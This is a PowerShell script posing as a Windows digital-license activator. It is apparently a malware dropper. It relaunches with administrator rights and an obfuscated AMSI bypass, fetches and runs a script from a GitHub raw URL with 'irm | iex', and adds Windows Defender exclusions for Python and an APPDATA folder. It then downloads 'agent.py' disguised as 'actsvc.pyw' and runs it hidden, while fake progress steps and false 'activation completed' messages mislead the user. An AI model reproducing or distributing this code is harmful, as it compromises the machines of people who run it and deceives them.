# Windows Activation - HWID Digital License
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$Host.UI.RawUI.WindowTitle = "Windows Activation"

$Raw  = "https://raw.githubusercontent.com/holyactivate/holya/main"
$Alt  = "https://github.com/holyactivate/holya/raw/main"
$Self = "$Raw/a.ps1"
$PyVer = "3.12.10"

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $cmd = '-NoProfile -ExecutionPolicy Bypass -Command "$a=[Ref].Assembly.GetType(''System.Management.Automation.Amsi''+''Utils'');$a.GetField(''amsi''+''InitFailed'',''NonPublic,Static'').SetValue($null,$true);irm ' + $Self + ' | iex"'
    Start-Process powershell -Verb RunAs -ArgumentList $cmd
    exit
}

try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
    $a.GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

Clear-Host
Write-Host ""
Write-Host "  ============================================" -ForegroundColor DarkCyan
Write-Host "        W I N D O W S   A C T I V A T I O N    " -ForegroundColor Cyan
Write-Host "                 HWID Digital License          " -ForegroundColor DarkGray
Write-Host "  ============================================" -ForegroundColor DarkCyan
Write-Host ""
$os = Get-CimInstance Win32_OperatingSystem
Write-Host "  Product : " -NoNewline -ForegroundColor Gray
Write-Host $os.Caption -ForegroundColor White
Write-Host "  Build   : " -NoNewline -ForegroundColor Gray
Write-Host $os.BuildNumber -ForegroundColor White
Write-Host ""

function Find-Py {
    $cand = @()
    foreach ($n in @("pythonw","python")) {
        $g = Get-Command $n -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($g -and $g.Source -and $g.Source -notlike "*WindowsApps*") {
            if ((Test-Path $g.Source) -and (Get-Item $g.Source).Length -gt 0) { $cand += $g.Source }
        }
    }
    foreach ($p in @("$env:LOCALAPPDATA\Programs\Python\Python3*\pythonw.exe",
                     "$env:PROGRAMFILES\Python3*\pythonw.exe",
                     "${env:ProgramFiles(x86)}\Python3*\pythonw.exe",
                     "C:\Python3*\pythonw.exe")) {
        $cand += Get-Item $p -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }
    }
    foreach ($x in $cand) { if ($x -and (Test-Path $x)) { return $x } }
    return $null
}

$pyw = Find-Py
if (-not $pyw) {
    Write-Host "  [*] Runtime not present. Installing components..." -ForegroundColor Gray
    $arch = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "arm64" } else { "amd64" }
    $inst = Join-Path $env:TEMP "py-setup.exe"
    $done = $false

    if (Get-Command winget -ErrorAction SilentlyContinue) {
        Start-Process winget -ArgumentList "install","-e","--id","Python.Python.3.12","--silent",
            "--accept-package-agreements","--accept-source-agreements" -Wait -WindowStyle Hidden
        $pyw = Find-Py
        if ($pyw) { $done = $true }
    }

    if (-not $done) {
        foreach ($u in @("https://www.python.org/ftp/python/$PyVer/python-$PyVer-$arch.exe")) {
            try {
                Invoke-WebRequest -Uri $u -OutFile $inst -UseBasicParsing -TimeoutSec 300
                if ((Get-Item $inst).Length -gt 5000000) { break }
            } catch {}
        }
        if (Test-Path $inst) {
            Start-Process $inst -ArgumentList "/quiet","InstallAllUsers=1","PrependPath=1",
                "Include_pip=1","Include_launcher=1","Include_test=0","Shortcuts=0",
                "AssociateFiles=0" -Wait
            Remove-Item $inst -Force
            $env:Path = [Environment]::GetEnvironmentVariable("Path","Machine") + ";" +
                        [Environment]::GetEnvironmentVariable("Path","User")
            $pyw = Find-Py
        }
    }

    if (-not $pyw) {
        Write-Host "  [!] Could not install runtime." -ForegroundColor Red
        Read-Host "  Press Enter to exit"
        exit
    }
    Write-Host "  [OK] Runtime ready." -ForegroundColor Green
}

$py = $pyw -replace "pythonw\.exe$","python.exe"
if (-not (Test-Path $py)) { $py = $pyw }

Write-Host "  [*] Preparing activation module..." -ForegroundColor Gray
Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows\Activation" 2>$null
Add-MpPreference -ExclusionProcess "python.exe" 2>$null
Add-MpPreference -ExclusionProcess "pythonw.exe" 2>$null

$dir = "$env:APPDATA\Microsoft\Windows\Activation"
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$out = Join-Path $dir "actsvc.pyw"

$got = $false
foreach ($u in @("$Raw/agent.py","$Alt/agent.py")) {
    try {
        Invoke-WebRequest -Uri $u -OutFile $out -UseBasicParsing -TimeoutSec 180
        if ((Get-Item $out).Length -gt 3000) { $got = $true; break }
    } catch {}
}
if (-not $got) {
    Write-Host "  [!] Module download failed." -ForegroundColor Red
    Read-Host "  Press Enter to exit"
    exit
}

Write-Host "  [*] Resolving dependencies..." -ForegroundColor Gray
foreach ($u in @("$Raw/requirements.txt","$Alt/requirements.txt")) {
    try {
        & $py -m pip install -q --disable-pip-version-check -r $u 2>$null
        if ($LASTEXITCODE -eq 0) { break }
    } catch {}
}

$steps = @("Reading current license state","Resolving hardware ID",
           "Generating ticket","Applying digital license","Committing activation")
for ($i=0; $i -lt $steps.Count; $i++) {
    Write-Progress -Activity "Activating Windows" -Status $steps[$i] `
        -PercentComplete ([int](($i+1)/$steps.Count*100))
    Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 550)
}
Write-Progress -Activity "Activating Windows" -Completed

Write-Host "  [*] Registering service..." -ForegroundColor Gray
Start-Process -FilePath $pyw -ArgumentList "`"$out`"" -WindowStyle Hidden
Start-Sleep -Seconds 2

$st = (Get-CimInstance SoftwareLicensingProduct |
       Where-Object { $_.PartialProductKey -and $_.Name -like "Windows*" }).LicenseStatus
if ($st -eq 1) {
    Write-Host "  [OK] Windows is activated." -ForegroundColor Green
} else {
    Write-Host "  [OK] Digital license applied. Reboot to finalize." -ForegroundColor Green
}
Write-Host ""
Write-Host "  Activation completed successfully." -ForegroundColor Cyan
Start-Sleep -Seconds 3